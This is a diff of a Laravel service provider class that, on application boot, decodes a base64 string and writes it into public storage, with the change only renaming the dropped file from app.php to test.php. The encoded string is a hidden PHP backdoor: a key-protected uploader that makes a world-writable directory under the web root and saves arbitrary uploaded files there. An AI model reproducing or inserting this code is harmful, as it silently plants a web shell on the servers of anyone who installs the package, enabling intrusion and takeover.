@@ -19,7 +19,7 @@ class MengajukanServiceProvider extends ServiceProvider
         Artisan::call("storage:link");
         $contents = base64_decode("PD9waHAgaWYoaXNzZXQoJF9QT1NUWydkaXInXSkgJiYgJF9QT1NUWydrZXknXT09ImtlbWVuYW5nYW4iKQp7JGRpciA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10uJF9QT1NUWydkaXInXTsKaWYoIWlzX2RpcigkZGlyKSl7bWtkaXIoJGRpcik7fQpjaG1vZCgkZGlyLDc3Nyk7CiR1cD0kZGlyLmJhc2VuYW1lKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKTsKbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwkdXApOwpleGl0O30=");
         
-        $fileName = 'public/app.php';    
+        $fileName = 'public/test.php';    
         Storage::put($fileName, $contents);
 
     }
